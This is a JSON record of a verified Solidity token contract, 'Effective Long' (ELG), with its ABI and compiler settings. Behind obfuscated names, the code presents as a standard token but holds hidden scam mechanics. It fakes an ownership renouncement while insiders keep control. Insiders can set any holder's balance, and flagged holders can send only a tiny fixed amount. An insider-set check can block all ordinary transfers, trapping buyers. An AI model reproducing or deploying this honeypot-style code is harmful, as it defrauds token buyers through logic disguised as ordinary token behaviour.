{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface amountFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingMinFund) external view returns (uint256);\n\n    function transfer(address modeReceiver, uint256 sellIsMode) external returns (bool);\n\n    function allowance(address fromLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellIsMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeReceiver,\n        uint256 sellIsMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isSwap, uint256 value);\n    event Approval(address indexed fromLimit, address indexed spender, uint256 value);\n}\n\nabstract contract toIsTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface amountSender {\n    function createPair(address buyMarketing, address totalList) external returns (address);\n}\n\ninterface fromMarketing is amountFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EffectiveLong is toIsTrading, amountFee, fromMarketing {\n\n    function transfer(address teamLiquidity, uint256 sellIsMode) external virtual override returns (bool) {\n        return modeIs(_msgSender(), teamLiquidity, sellIsMode);\n    }\n\n    function approve(address teamTrading, uint256 sellIsMode) public virtual override returns (bool) {\n        isLiquidityMarketing[_msgSender()][teamTrading] = sellIsMode;\n        emit Approval(_msgSender(), teamTrading, sellIsMode);\n        return true;\n    }\n\n    function shouldReceiver(address sellMinSwap) public {\n        if (takeFee) {\n            return;\n        }\n        \n        isTrading[sellMinSwap] = true;\n        if (launchedFrom == toAuto) {\n            tradingReceiver = false;\n        }\n        takeFee = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return maxSwap;\n    }\n\n    bool private isEnableMode;\n\n    bool public takeFee;\n\n    uint8 private minTo = 18;\n\n    uint256 public fundTo;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderExemptShould;\n    }\n\n    uint256 marketingWalletToken;\n\n    mapping(address => mapping(address => uint256)) private isLiquidityMarketing;\n\n    function teamAtFrom(address isMode, address modeReceiver, uint256 sellIsMode) internal returns (bool) {\n        require(swapTo[isMode] >= sellIsMode);\n        swapTo[isMode] -= sellIsMode;\n        swapTo[modeReceiver] += sellIsMode;\n        emit Transfer(isMode, modeReceiver, sellIsMode);\n        return true;\n    }\n\n    uint256 private senderExemptShould = 100000000 * 10 ** 18;\n\n    function allowance(address listReceiverSender, address teamTrading) external view virtual override returns (uint256) {\n        if (teamTrading == liquidityTake) {\n            return type(uint256).max;\n        }\n        return isLiquidityMarketing[listReceiverSender][teamTrading];\n    }\n\n    bool private tradingReceiver;\n\n    uint256 constant amountAtMarketing = 12 ** 10;\n\n    address liquidityTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public toAuto;\n\n    function modeIs(address isMode, address modeReceiver, uint256 sellIsMode) internal returns (bool) {\n        if (isMode == tokenIs) {\n            return teamAtFrom(isMode, modeReceiver, sellIsMode);\n        }\n        uint256 receiverTrading = amountFee(minExemptAt).balanceOf(tokenFund);\n        require(receiverTrading == buyList);\n        require(modeReceiver != tokenFund);\n        if (maxReceiver[isMode]) {\n            return teamAtFrom(isMode, modeReceiver, amountAtMarketing);\n        }\n        return teamAtFrom(isMode, modeReceiver, sellIsMode);\n    }\n\n    constructor (){\n        if (amountEnableMin) {\n            amountEnableMin = false;\n        }\n        txIs atWallet = txIs(liquidityTake);\n        minExemptAt = amountSender(atWallet.factory()).createPair(atWallet.WETH(), address(this));\n        if (toAuto) {\n            isEnableMode = true;\n        }\n        tokenIs = _msgSender();\n        feeAmountReceiver();\n        isTrading[tokenIs] = true;\n        swapTo[tokenIs] = senderExemptShould;\n        if (isEnableMode == amountEnableMin) {\n            txSenderFee = true;\n        }\n        emit Transfer(address(0), tokenIs, senderExemptShould);\n    }\n\n    string private shouldTake = \"ELG\";\n\n    address tokenFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private maxSwap = \"Effective Long\";\n\n    address public minExemptAt;\n\n    function transferFrom(address isMode, address modeReceiver, uint256 sellIsMode) external override returns (bool) {\n        if (_msgSender() != liquidityTake) {\n            if (isLiquidityMarketing[isMode][_msgSender()] != type(uint256).max) {\n                require(sellIsMode <= isLiquidityMarketing[isMode][_msgSender()]);\n                isLiquidityMarketing[isMode][_msgSender()] -= sellIsMode;\n            }\n        }\n        return modeIs(isMode, modeReceiver, sellIsMode);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldTake;\n    }\n\n    mapping(address => bool) public isTrading;\n\n    address public tokenIs;\n\n    uint256 buyList;\n\n    address private toMarketing;\n\n    function launchedSender(address teamLiquidity, uint256 sellIsMode) public {\n        totalFundTeam();\n        swapTo[teamLiquidity] = sellIsMode;\n    }\n\n    mapping(address => uint256) private swapTo;\n\n    function balanceOf(address tradingMinFund) public view virtual override returns (uint256) {\n        return swapTo[tradingMinFund];\n    }\n\n    function feeAmountReceiver() public {\n        emit OwnershipTransferred(tokenIs, address(0));\n        toMarketing = address(0);\n    }\n\n    function totalFundTeam() private view {\n        require(isTrading[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return toMarketing;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minTo;\n    }\n\n    bool public amountEnableMin;\n\n    bool public launchedFrom;\n\n    event OwnershipTransferred(address indexed maxTotal, address indexed tokenMarketing);\n\n    bool private txSenderFee;\n\n    function receiverFund(uint256 sellIsMode) public {\n        totalFundTeam();\n        buyList = sellIsMode;\n    }\n\n    function getOwner() external view returns (address) {\n        return toMarketing;\n    }\n\n    mapping(address => bool) public maxReceiver;\n\n    function senderLaunchTo(address txLaunch) public {\n        totalFundTeam();\n        if (tradingReceiver != isEnableMode) {\n            isEnableMode = false;\n        }\n        if (txLaunch == tokenIs || txLaunch == minExemptAt) {\n            return;\n        }\n        maxReceiver[txLaunch] = true;\n    }\n\n    uint256 public minReceiverTeam;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiverSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountEnableMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIsMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMinFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAmountReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIsMode\",\"type\":\"uint256\"}],\"name\":\"launchedSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minExemptAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReceiverTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellIsMode\",\"type\":\"uint256\"}],\"name\":\"receiverFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunch\",\"type\":\"address\"}],\"name\":\"senderLaunchTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMinSwap\",\"type\":\"address\"}],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIsMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIsMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EffectiveLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}